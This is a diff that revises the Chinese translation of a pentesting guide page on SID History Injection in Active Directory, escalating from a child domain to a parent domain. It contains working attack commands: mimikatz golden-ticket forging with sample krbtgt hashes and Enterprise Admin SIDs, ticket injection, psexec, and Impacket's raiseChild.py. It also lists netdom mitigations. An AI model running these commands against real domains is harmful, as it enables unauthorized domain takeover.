@@ -2,24 +2,24 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## SID History Injection Attack
+## SID 历史注入攻击
 
-**SID History Injection Attack** 的重点是帮助 **用户在域之间迁移** 的同时确保继续访问前一个域的资源。这是通过 **将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史** 来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式赋予了对父域内所有资源的访问权限。
+**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式赋予对父域内所有资源的访问权限。
 
-执行此攻击有两种方法：通过创建 **Golden Ticket** 或 **Diamond Ticket**。
+执行此攻击有两种方法：通过创建**黄金票证**或**钻石票证**。
 
-要确定 **"Enterprise Admins"** 组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 是 `S-1-5-21-280534878-1496970234-700767426`，那么 "Enterprise Admins" 组的结果 SID 将是 `S-1-5-21-280534878-1496970234-700767426-519`。
+要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的结果 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。
 
-您还可以使用 **Domain Admins** 组，其 SID 以 **512** 结尾。
+您还可以使用**域管理员**组，其 SID 以**512**结尾。
 
-找到其他域（例如 "Domain Admins"）的组 SID 的另一种方法是：
+找到其他域（例如“域管理员”）组的 SID 的另一种方法是：
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
 > 请注意，在信任关系中禁用 SID 历史记录可能会导致此攻击失败。
 
-根据[**文档**](https://technet.microsoft.com/library/cc835085.aspx)：
+根据[**docs**](https://technet.microsoft.com/library/cc835085.aspx)：
 - **在森林信任上禁用 SIDHistory** 使用 netdom 工具（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
 - **对外部信任应用 SID 过滤隔离** 使用 netdom 工具（`netdom trust /domain: /quarantine:yes on the domain controller`）
 - **对单个森林内的域信任应用 SID 过滤** 不推荐，因为这是一种不受支持的配置，可能会导致破坏性更改。如果森林中的某个域不可信，则不应成为该森林的成员。在这种情况下，必须首先将受信任和不受信任的域分割到不同的森林中，以便可以对森林间信任应用 SID 过滤。
@@ -63,12 +63,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 有关 golden tickets 的更多信息，请查看：
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 有关 diamond tickets 的更多信息，请查看：
+
 
 {{#ref}}
 diamond-ticket.md
@@ -78,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-使用被攻陷域的 KRBTGT 哈希提升到根或企业管理员权限：
+使用被攻陷域的 KRBTGT 哈希提升到根或企业管理员的 DA：
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -120,7 +122,7 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### 自动使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-这是一个 Impacket 脚本，**自动从子域提升到父域**。该脚本需要：
+这是一个 Impacket 脚本，它将 **自动化从子域提升到父域**。该脚本需要：
 
 - 目标域控制器
 - 子域中管理员用户的凭据
@@ -132,7 +134,7 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 - 创建一个黄金票证
 - 登录到父域
 - 检索父域中管理员账户的凭据
-- 如果指定了 `target-exec` 开关，则通过 Psexec 认证到父域的域控制器。
+- 如果指定了 `target-exec` 开关，它将通过 Psexec 认证到父域的域控制器。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
